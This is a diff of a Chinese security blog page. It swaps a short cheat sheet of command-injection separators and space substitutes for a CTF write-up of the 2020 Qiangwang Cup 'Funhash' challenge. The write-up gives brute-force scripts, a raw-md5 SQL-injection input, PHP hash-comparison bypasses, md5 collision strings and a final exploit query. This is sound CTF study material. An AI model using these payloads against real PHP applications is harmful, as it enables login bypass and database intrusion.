@@ -22,12 +22,12 @@
   
   
   
-  <title>命令执行 | iluem&#39;Blog</title>
+  <title>强网杯 2020 Writeup | iluem&#39;Blog</title>
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
   
-    <meta name="keywords" content="Web,知识点," />
+    <meta name="keywords" content="Web,CTF," />
   
 
   <script>
@@ -227,12 +227,12 @@
 
 <div class="post">
   <h1 class="article-title">
-    <span>命令执行</span>
+    <span>强网杯 2020 Writeup</span>
   </h1>
   <div class="article-top-meta">
     <span>
       发布 : 
-      2020-07-15
+      2020-08-23
     </span>
     
       <span>
@@ -244,7 +244,7 @@
     
     
       <span>
-        浏览 : <span class="article-timer" data-identity="passages命令执行"></span>
+        浏览 : <span class="article-timer" data-identity="passages2020强网杯"></span>
       </span>
     
   </div>
@@ -253,18 +253,94 @@
 
   <div class="article-content">
     <div class="markdown-body">
-      <h1 id="命令执行的分隔符"><a href="#命令执行的分隔符" class="headerlink" title="命令执行的分隔符"></a>命令执行的分隔符</h1><p><strong>换行符</strong>    %0a</p>
-<p><strong>回车符</strong>    %0d</p>
-<p><strong>连续指令</strong>    ；</p>
-<p><strong>后台进程</strong>     &amp;</p>
-<p><strong>管道符</strong>    |</p>
-<p><strong>逻辑</strong>    ||    &amp;&amp;</p>
-<h1 id="命令执行的空格代替"><a href="#命令执行的空格代替" class="headerlink" title="命令执行的空格代替"></a>命令执行的空格代替</h1><p>&lt;</p>
-<p>$IFS</p>
-<p>${IFS}</p>
-<p>$IFS$9</p>
-<p>%09(tab)</p>
+      <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Funhash"><a href="#Funhash" class="headerlink" title="Funhash"></a>Funhash</h2><p>这题不是什么新知识，谷歌一下都能搜到，主要记录一下方便可能用到时查找。</p>
+<pre><code class="php">&lt;?php
+include &#39;conn.php&#39;;
+highlight_file(&quot;index.php&quot;);
+//level 1
+if ($_GET[&quot;hash1&quot;] != hash(&quot;md4&quot;, $_GET[&quot;hash1&quot;]))
+{
+    die(&#39;level 1 failed&#39;);
+}
 
+//level 2
+if($_GET[&#39;hash2&#39;] === $_GET[&#39;hash3&#39;] || md5($_GET[&#39;hash2&#39;]) !== md5($_GET[&#39;hash3&#39;]))
+{
+    die(&#39;level 2 failed&#39;);
+}
+
+//level 3
+$query = &quot;SELECT * FROM flag WHERE password = &#39;&quot; . md5($_GET[&quot;hash4&quot;],true) . &quot;&#39;&quot;;
+$result = $mysqli-&gt;query($query);
+$row = $result-&gt;fetch_assoc(); 
+var_dump($row);
+$result-&gt;free();
+$mysqli-&gt;close();
+
+?&gt;</code></pre>
+<p><code>level1</code>应该出自国外的一个比赛<code>HSCTF 6 CTF</code></p>
+<p>爆破脚本如下</p>
+<pre><code>&lt;?php 
+for($i=1,$i&lt;1000000000;$i++;){
+    if(&#39;0e&#39;.$i == hash(&quot;md4&quot;, &#39;0e&#39;.$i))
+    {
+        print_r(&#39;Get it : 0e&#39;.$i);
+        break;
+    }
+    if($i%1000000==0)
+        echo &#39;.&#39;;
+}
+爆出0e开头的即成功，第一个是0e251288019,第二个是0e688801293</code></pre><p>大佬的脚本</p>
+<pre><code class="python">import hashlib
+import Crypto.Hash.MD4
+import re
+prefix = &#39;0e&#39;
+def breakit():
+    iters = 0
+    while 1:
+        s  = (prefix + str(iters)).encode(&#39;utf-8&#39;)
+        hashed_s = hashlib.new(&#39;md4&#39;, s).hexdigest()
+        iters = iters + 1
+        r = re.match(&#39;^0e[0-9]{30}&#39;, hashed_s)
+        if r:
+            print (&quot;[+] found! md4( {} ) ---&gt; {}&quot;.format(s, hashed_s))
+            print (&quot;[+] in {} iterations&quot;.format(iters))
+            exit(0)
+        if iters % 1000000 == 0:
+            print (&quot;[+] current value: {}       {} iterations, continue...&quot;.format(s, iters))
+breakit()</code></pre>
+<p><code>level2</code>应该已经做烂了，数组绕过即可。</p>
+<p><code>level3</code>这题也已经早在2010年就出过了，</p>
+<p><img src="https://images3.pianshen.com/628/82/82cfd651718361f9bb8da4ef7c667cdc.png" alt="img"></p>
+<p>爆破脚本如下</p>
+<pre><code class="php">&lt;?php 
+for ($i = 0;;) { 
+ for ($c = 0; $c &lt; 1000000; $c++, $i++)
+  if (stripos(md5($i, true), &#39;\&#39;or\&#39;&#39;) !== false)
+   echo &quot;\nmd5($i) = &quot; . md5($i, true) . &quot;\n&quot;;
+ echo &quot;.&quot;;
+}
+?&gt;</code></pre>
+<p>记录两个可用的值</p>
+<pre><code>content: 129581926211651571912466741651878684928
+hex: 06da5430449f8f6f23dfc1276f722738
+raw: \x06\xdaT0D\x9f\x8fo#\xdf\xc1&#39;or&#39;8
+string: T0Do#&#39;or&#39;8
+
+content: ffifdyop
+hex: 276f722736c95d99e921722cf9ed621c
+raw: &#39;or&#39;6\xc9]\x99\xe9!r,\xf9\xedb\x1c
+string: &#39;or&#39;6]!r,b</code></pre><p>最终payload</p>
+<pre><code>?hash1=0e688801293&amp;hash2[]=1&amp;hash3[]=&amp;hash4=129581926211651571912466741651878684928</code></pre><p>此外，再记录一下md5强碰撞的值</p>
+<p><img src="https://i.loli.net/2020/08/25/v2ulkOLHtKaVE1p.png" alt="image-20200825005222281"></p>
+<p>对于这种类型的检测，就不能使用数组绕过了，因为数组经过string强制转换后就会变成字符<code>Array</code></p>
+<pre><code>php &gt; var_dump((string)([]));
+string(5) &quot;Array&quot;</code></pre><p>贴上几个可用的值</p>
+<pre><code>a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
+
+a=%D11%DD%02%C5%E6%EE%C4i%3D%9A%06%98%AF%F9%5C/%CA%B5%87%12F%7E%AB%40%04X%3E%B8%FB%7F%89U%AD4%06%09%F4%B3%02%83%E4%88%83%25qAZ%08Q%25%E8%F7%CD%C9%9F%D9%1D%BD%F2%807%3C%5B%D8%82%3E1V4%8F%5B%AEm%AC%D46%C9%19%C6%DDS%E2%B4%87%DA%03%FD%029c%06%D2H%CD%A0%E9%9F3B%0FW%7E%E8%CET%B6p%80%A8%0D%1E%C6%98%21%BC%B6%A8%83%93%96%F9e%2Bo%F7%2Ap&amp;b=%D11%DD%02%C5%E6%EE%C4i%3D%9A%06%98%AF%F9%5C/%CA%B5%07%12F%7E%AB%40%04X%3E%B8%FB%7F%89U%AD4%06%09%F4%B3%02%83%E4%88%83%25%F1AZ%08Q%25%E8%F7%CD%C9%9F%D9%1D%BDr%807%3C%5B%D8%82%3E1V4%8F%5B%AEm%AC%D46%C9%19%C6%DDS%E24%87%DA%03%FD%029c%06%D2H%CD%A0%E9%9F3B%0FW%7E%E8%CET%B6p%80%28%0D%1E%C6%98%21%BC%B6%A8%83%93%96%F9e%ABo%F7%2Ap
+
+a=%3C%3Fphp%0A%0A%24space%20%3D%20%22AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%22%3B%0Aif%20%28%27%FDG.%05%C9%ED%14%EE-%17%29%19%98%EE%D0%FF%F2%AA%01%01%2B%D3B%A9%1B%D68%85%EC%15%B2%E1A%BD%C6%C7P%AD%3B%22%8F%FEP%1B%C8%F9ZU%9C5%85%24q%024F%DF1%17c%D0-%C5%8FC%FFS%0A%D4%3Bcr%FB%21%9D%9A%1F%DE%5B%F6%0DP3%C8%95%CCJ%0D%02%E9e%D7MIM%FE%B5%BF%7E%F2%8F2%EC%85%3A%A8%5Db%91%F0%B2%5C%F6%8C/5%95%BF%C3%1C%5E%DBgn%7E3D7%27%20%3D%3D%20%27%FDG.%05%C9%ED%14%EE-%17%29%19%98%EE%D0%FF%F2%AA%01%01%2B%D3B%A9%1B%D68%85%EC%15%B2%E1A%BD%C6%C7P%AD%3B%22%8F%FEP%1B%C8%F9ZU%9C5%85%24q%024F%DF1%17c%D0-%C5%8FC%FFS%0A%D4%3Bcr%FB%21%9D%9A%1F%DE%5B%F6%0DP3%C8%95%CCJ%0D%02%E9e%D7MIM%FE%B5%BF%7E%F2%8F2%EC%85%3A%A8%5Db%91%F0%B2%5C%F6%8C/5%95%BF%C3%1C%5E%DBgn%7E3D7%27%20%29%20%7B%0A%20%20%20%20echo%20%27Behaviour%20A%27%2CPHP_EOL%3B%0A%7D%20else%20%7B%0A%20%20%20%20echo%20%27Behaviour%20B%27%2CPHP_EOL%3B%0A%7D&amp;b=%3C%3Fphp%0A%0A%24space%20%3D%20%22AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%22%3B%0Aif%20%28%27%FDG.%05%C9%ED%14%EE-%17%29%19%98%EE%D0%FF%F2%AA%01%81%2B%D3B%A9%1B%D68%85%EC%15%B2%E1A%BD%C6%C7P%AD%3B%22%8F%FEP%1B%C8y%5BU%9C5%85%24q%024F%DF1%17%E3%D0-%C5%8FC%FFS%0A%D4%3Bcr%FB%21%9D%9A%1F%DE%5B%F6%0DP3H%95%CCJ%0D%02%E9e%D7MIM%FE%B5%BF%7E%F2%8F2%EC%85%3A%A8%5Db%91p%B2%5C%F6%8C/5%95%BF%C3%1C%5E%DBg%EE%7E3D7%27%20%3D%3D%20%27%FDG.%05%C9%ED%14%EE-%17%29%19%98%EE%D0%FF%F2%AA%01%01%2B%D3B%A9%1B%D68%85%EC%15%B2%E1A%BD%C6%C7P%AD%3B%22%8F%FEP%1B%C8%F9ZU%9C5%85%24q%024F%DF1%17c%D0-%C5%8FC%FFS%0A%D4%3Bcr%FB%21%9D%9A%1F%DE%5B%F6%0DP3%C8%95%CCJ%0D%02%E9e%D7MIM%FE%B5%BF%7E%F2%8F2%EC%85%3A%A8%5Db%91%F0%B2%5C%F6%8C/5%95%BF%C3%1C%5E%DBgn%7E3D7%27%20%29%20%7B%0A%20%20%20%20echo%20%27Behaviour%20A%27%2CPHP_EOL%3B%0A%7D%20else%20%7B%0A%20%20%20%20echo%20%27Behaviour%20B%27%2CPHP_EOL%3B%0A%7D</code></pre>
     </div>
   </div>
   
@@ -280,8 +356,8 @@
           <i class="iconfont icon-06tags"></i>标签: 
           
           <span class="span--tag">
-            <a href="/tags/%E7%9F%A5%E8%AF%86%E7%82%B9/">
-              #知识点
+            <a href="/tags/CTF/">
+              #CTF
             </a>
           </span>
           
@@ -306,15 +382,9 @@
       <div class="nav-pre">
         <i class="iconfont icon-prev"></i>
         上一篇:
-        <a href="/passagesSQL/" target="_self">SQL注入相关知识点</a>
+        <a href="/passages%E5%9B%BD%E8%B5%9B/" target="_self">CISCN 2020 Web Writeup</a>
       </div>
     
-    
-      <div class="nav-next">
-        下一篇:
-        <a href="/passagessqli-labs/" target="_self">Sqli-labs</a>
-        <i class="iconfont icon-next"></i>
-      </div>
     
   </nav>
 
